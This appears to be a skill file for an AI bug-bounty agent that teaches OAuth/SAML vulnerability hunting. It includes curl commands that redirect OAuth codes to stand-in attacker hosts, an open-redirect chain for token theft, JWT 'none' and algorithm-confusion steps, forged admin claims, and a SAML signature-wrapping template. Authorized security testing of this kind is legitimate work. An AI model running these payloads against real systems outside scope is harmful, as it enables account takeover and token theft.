---
name: hunt-oauth
description: OAuth/SAML hunting with differential testing — Token theft, redirect URI manipulation, SSO bypass, JWT attacks. Every candidate must demonstrate token theft or authentication bypass. 7-gate validation mandatory.
---

# OAUTH/SAML HUNTING — DIFFERENTIAL TESTING METHOD

**OAuth flaws lead directly to ATO. Test the entire auth flow.**

---

## HYPOTHESIS GENERATION

```
HYPOTHESIS: OAuth [vuln class]
  Flow: [authorization_code / implicit / password_grant]
  Endpoint: [authorization / token / callback]
  Precondition: [authenticated user]
  Expected: Redirect URI validated, state verified, tokens bound
  Attack: Intercept/forge tokens, manipulate redirects
  Impact: Account takeover
  Confidence: [HIGH/MEDIUM/LOW]
```

---

## DIFFERENTIAL TESTING METHOD

### Redirect URI Differential

```
TEST MATRIX:
  Legitimate redirect_uri → 200 (baseline)
  Attacker's redirect_uri → should FAIL (400/rejected)
  Subdomain bypass → should FAIL
  Parameter pollution → should FAIL
  URL parsing tricks → should FAIL

FINDING: If attacker's redirect_uri is accepted → token theft → ATO
```

### Implementation

```bash
# Step 1: Capture legitimate OAuth URL
# Look for: redirect_uri parameter in authorization URL

# Step 2: Test redirect URI manipulation
# Subdomain bypass
curl -s "https://target.com/auth?redirect_uri=https://evil.target.com/callback"

# Parameter pollution
curl -s "https://target.com/auth?redirect_uri=https://legit.com&redirect_uri=https://attacker.com"

# URL parsing tricks
curl -s "https://target.com/auth?redirect_uri=https://attacker.com@target.com"
curl -s "https://target.com/auth?redirect_uri=https://target.com#@attacker.com"

# Open redirect chain
curl -s "https://target.com/auth?redirect_uri=https://target.com/redirect?url=https://attacker.com"
```

### JWT Algorithm Confusion

```bash
# Decode JWT
echo "eyJhbGciOiJIUzI1NiJ9..." | base64 -d

# Change algorithm
# From: RS256 (asymmetric) → HS256 (symmetric)
# Sign with PUBLIC KEY as secret

# None algorithm
# Change alg to "none", remove signature
```

### State Parameter Bypass

```bash
# Remove state parameter entirely
# Replay authorization code without state
# Check if state is validated server-side
```

---

## ATTACK PATTERNS

### OAuth Token Theft via Open Redirect

```
Step 1: Find open redirect at /redirect?url=evil.com
Step 2: Find OAuth flow uses /redirect as callback
Step 3: Chain: Open redirect → OAuth code interception
Attack: https://target.com/auth?redirect_uri=https://target.com/redirect?url=https://attacker.com/callback
Evidence: OAuth code visible in redirect chain
```

### JWT None Algorithm

```json
{
  "alg": "none",
  "typ": "JWT"
}
// Remove signature, send token
```

### JWT Claim Manipulation

```json
{
  "sub": "admin",
  "role": "admin",
  "exp": 9999999999
}
```

### SAML Signature Wrapping

```xml
<!-- Move original assertion inside new element -->
<saml:Assertion>
  <xx:Execute xmlns:xx="http://example.com">
    <saml:Assertion>
      <saml:Subject><saml:NameID>admin@example.com</saml:NameID></saml:Subject>
    </saml:Assertion>
  </xx:Execute>
</saml:Assertion>
<!-- Signature still validates, but app processes inner assertion -->
```

---

## GATE VALIDATION CHECKLIST

### Gate 1 — Scope
- [ ] OAuth/auth endpoint in scope

### Gate 2 — Security Boundary
- [ ] Authentication boundary crossed
- [ ] Token theft or auth bypass demonstrated

### Gate 3 — Attacker Capability
- [ ] Starting position: unauthenticated attacker

### Gate 4 — Reproducibility
- [ ] Exact OAuth flow steps captured
- [ ] Token/code shown in attacker's control

### Gate 5 — Impact
- [ ] Impact: Account takeover (Critical)

### Gate 6 — False Positive Elimination
- [ ] Token actually works (can authenticate)
- [ ] Not just a redirect (must intercept token)
- [ State parameter actually not validated

### Gate 7 — Program Acceptance
- [ ] OAuth bugs in scope
- [ ] Impact meets threshold

---

## ESCALATION CHAINS

```
Open redirect → OAuth redirect_uri abuse → ATO → Critical
JWT none algorithm → admin access → Critical
SAML signature wrapping → impersonation → Critical
OAuth state bypass → CSRF on auth → High
```
